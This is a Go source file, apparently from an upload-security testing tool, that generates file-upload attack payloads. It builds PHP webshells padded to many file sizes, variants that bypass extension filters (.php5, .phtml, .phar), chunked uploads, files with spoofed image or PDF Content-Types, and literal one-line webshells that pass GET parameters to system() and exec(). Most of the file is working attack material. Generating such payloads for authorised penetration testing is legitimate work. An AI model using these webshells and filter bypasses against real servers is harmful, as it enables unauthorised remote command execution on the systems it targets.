package payload

import (
    "bytes"
	"fmt"
	"strings"
)

// moduleE generates Size Boundary and File Size Restriction test payloads.
// Tests for file size limits, partial uploads, and potential DoS conditions.
func moduleE() []*Payload {
	var tests []*Payload

	// E1: Size boundary tests with PHP webshells
	sizeTests := []struct {
		size      int
		label     string
		technique string
	}{
		{0, "0B", "Empty file (0 bytes) - tests minimum size validation"},
		{1, "1B", "1 byte file - tests single byte upload"},
		{10, "10B", "10 bytes - tiny PHP webshell"},
		{100, "100B", "100 bytes - small payload"},
		{512, "512B", "512 bytes - common chunk size"},
		{1024, "1KB", "1 KB file - tests small file handling"},
		{1024 * 10, "10KB", "10 KB file"},
		{1024 * 50, "50KB", "50 KB file"},
		{1024 * 100, "100KB", "100 KB file - common upload limit"},
		{1024 * 500, "500KB", "500 KB file"},
		{1024 * 1024, "1MB", "1 MB file - tests standard limits"},
		{1024 * 1024 * 2, "2MB", "2 MB file - common PHP default limit"},
		{1024 * 1024 * 5, "5MB", "5 MB file"},
		{1024 * 1024 * 10, "10MB", "10 MB file - tests larger limits"},
		{1024 * 1024 * 20, "20MB", "20 MB file - memory pressure test"},
		{1024 * 1024 * 50, "50MB", "50 MB file - max PHP default limit"},
		{1024 * 1024 * 100, "100MB", "100 MB file - potential DoS vector"},
	}

	for _, st := range sizeTests {
		// Create body with PHP code followed by padding
		body := make([]byte, st.size)
		
		// Copy PHP webshell at the beginning
		copy(body, phpWebshell)
		
		// Fill remaining bytes with padding (simulates large file)
		if st.size > len(phpWebshell) {
			padding := []byte(" // PADDING_DATA_TO_REACH_SIZE_LIMIT_")
			for i := len(phpWebshell); i < st.size; i++ {
				body[i] = padding[i%len(padding)]
			}
		}

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: fmt.Sprintf("Size boundary: %s PHP file", st.label),
			Filename:  fmt.Sprintf("size_%s.php", strings.ToLower(strings.ReplaceAll(st.label, " ", "_"))),
			Extension: ".php",
			Body:      body,
			Tags:      []string{"size-boundary", "file-size", st.label},
		})
	}

	// E2: Size boundary with alternative extensions (bypass size + extension filters)
	altExtSizeTests := []struct {
		ext  string
		size int
		label string
	}{
		{".php5", 1024, "1KB"},
		{".phtml", 1024 * 10, "10KB"},
		{".phar", 1024 * 100, "100KB"},
		{".php5", 1024 * 1024, "1MB"},
		{".phtml", 1024 * 1024 * 5, "5MB"},
	}

	for _, st := range altExtSizeTests {
		body := make([]byte, st.size)
		copy(body, getPayloadForExtension(st.ext))
		
		if st.size > len(phpWebshell) {
			padding := []byte(" // SIZE_PADDING_")
			for i := len(phpWebshell); i < st.size; i++ {
				body[i] = padding[i%len(padding)]
			}
		}

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: fmt.Sprintf("Size + Extension bypass: %s %s file", st.label, st.ext),
			Filename:  fmt.Sprintf("size_bypass_%s%s", strings.ToLower(st.label), st.ext),
			Extension: st.ext,
			Body:      body,
			Tags:      []string{"size-boundary", "extension-bypass", st.label},
		})
	}

	// E3: Chunked/Partial upload simulation (small pieces)
	chunkTests := []struct {
		chunks    int
		totalSize int
		technique string
	}{
		{2, 1024, "2 chunks of 512B"},
		{4, 2048, "4 chunks of 512B"},
		{10, 10240, "10 chunks of 1KB"},
		{100, 102400, "100 chunks of 1KB"},
	}

	for _, ct := range chunkTests {
		body := make([]byte, ct.totalSize)
		copy(body, phpWebshell)
		
		// Simulate chunked upload by marking chunk boundaries
		chunkSize := ct.totalSize / ct.chunks
		for i := 0; i < ct.chunks; i++ {
			if i*chunkSize+len(phpWebshell) < ct.totalSize {
				marker := []byte(fmt.Sprintf("\n// CHUNK_%d\n", i))
				copy(body[i*chunkSize:], marker)
			}
		}

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: fmt.Sprintf("Chunked upload simulation: %s", ct.technique),
			Filename:  fmt.Sprintf("chunked_%d_chunks.php", ct.chunks),
			Extension: ".php",
			Body:      body,
			Tags:      []string{"chunked-upload", "partial-upload", "size-boundary"},
		})
	}

	// E4: Near-limit edge cases (tests exact size boundaries)
	edgeCases := []struct {
		size      int
		technique string
	}{
		{1024*1024 - 1, "1 byte under 1MB limit"},
		{1024 * 1024, "Exactly 1MB"},
		{1024*1024 + 1, "1 byte over 1MB limit"},
		{1024*1024*2 - 1, "1 byte under 2MB limit"},
		{1024 * 1024 * 2, "Exactly 2MB"},
		{1024*1024*2 + 1, "1 byte over 2MB limit"},
		{1024*1024*8 - 1, "1 byte under 8MB (common PHP default)"},
		{1024 * 1024 * 8, "Exactly 8MB"},
		{1024*1024*8 + 1, "1 byte over 8MB limit"},
	}

	for _, ec := range edgeCases {
		body := make([]byte, ec.size)
		copy(body, phpWebshell)
		
		if ec.size > len(phpWebshell) {
			padding := bytes.Repeat([]byte("P"), ec.size-len(phpWebshell))
			copy(body[len(phpWebshell):], padding)
		}

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: fmt.Sprintf("Edge case: %s (%d bytes)", ec.technique, ec.size),
			Filename:  fmt.Sprintf("edge_%d_bytes.php", ec.size),
			Extension: ".php",
			Body:      body,
			Tags:      []string{"edge-case", "size-boundary", "limit-testing"},
		})
	}

	// E5: Tiny webshells (minimal PHP payloads)
	tinyShells := []struct {
		shell     []byte
		technique string
	}{
		{[]byte(`<?=`+"`$_GET[0]`"+`?>`), "Ultra-short PHP webshell (15 bytes)"},
		{[]byte(`<?=system($_GET[1])?>`), "Short PHP system call (22 bytes)"},
		{[]byte(`<?php exec($_GET[c]);?>`), "Compact PHP exec (23 bytes)"},
		{[]byte(`<?=`+"`ls`"+`?>`), "Tiny command (9 bytes)"},
		{[]byte(`<?=phpinfo()?>`), "PHP info leak (15 bytes)"},
	}

	for _, ts := range tinyShells {
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: ts.technique,
			Filename:  "tiny.php",
			Extension: ".php",
			Body:      ts.shell,
			Tags:      []string{"tiny-payload", "minimal-shell", "size-boundary"},
		})
	}

	// E6: Size limits with Content-Type spoofing
	sizeWithCT := []struct {
		size      int
		ct        string
		technique string
	}{
		{1024 * 100, "image/jpeg", "100KB PHP as JPEG"},
		{1024 * 500, "image/png", "500KB PHP as PNG"},
		{1024 * 1024, "image/gif", "1MB PHP as GIF"},
		{1024 * 1024 * 2, "application/pdf", "2MB PHP as PDF"},
	}

	for _, sct := range sizeWithCT {
		body := make([]byte, sct.size)
		copy(body, phpWebshell)
		
		if sct.size > len(phpWebshell) {
			padding := bytes.Repeat([]byte("A"), sct.size-len(phpWebshell))
			copy(body[len(phpWebshell):], padding)
		}

		tests = append(tests, &Payload{
			TestType:    TestTypeContentTypeSpoof,
			Technique:   sct.technique,
			Filename:    fmt.Sprintf("size_ct_%d.php", sct.size),
			Extension:   ".php",
			Body:        body,
			ContentType: sct.ct,
			Tags:        []string{"size-boundary", "content-type-spoof", "combined-attack"},
		})
	}

	return tests
}
